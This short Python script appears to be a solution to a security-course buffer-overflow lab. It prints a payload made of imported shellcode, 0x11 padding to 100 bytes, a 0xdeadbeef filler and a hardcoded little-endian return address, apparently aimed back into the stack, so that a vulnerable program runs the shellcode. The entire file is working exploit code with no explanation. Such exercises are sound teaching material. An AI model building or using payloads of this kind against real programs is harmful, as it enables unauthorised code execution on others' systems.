#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(shellcode+b"\x11"*(100-len(shellcode))+pack("<II", 0xdeadbeef, 0xfffef568))